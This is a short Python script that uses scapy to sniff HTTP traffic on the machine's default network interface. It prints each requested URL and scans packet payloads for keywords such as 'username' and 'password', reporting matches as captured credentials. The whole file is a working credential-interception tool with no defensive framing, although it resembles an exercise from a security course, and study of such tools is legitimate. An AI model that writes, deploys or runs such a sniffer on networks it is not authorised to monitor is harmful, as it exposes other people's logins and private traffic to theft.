import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    print(f"\n[*] Sniffing traffic on {interface}...")
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode(errors='ignore')
        keywords = ["username", "user", "login", "password", "pass", "lp_"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url}")
        
        login_info = get_login_info(packet)
        if login_info:
            print(f"\n\n[!!!] POSSIBLE CREDENTIALS CAPTURED: {login_info}\n\n")

if __name__ == "__main__":
    interface = scapy.conf.iface.name
    sniff(interface)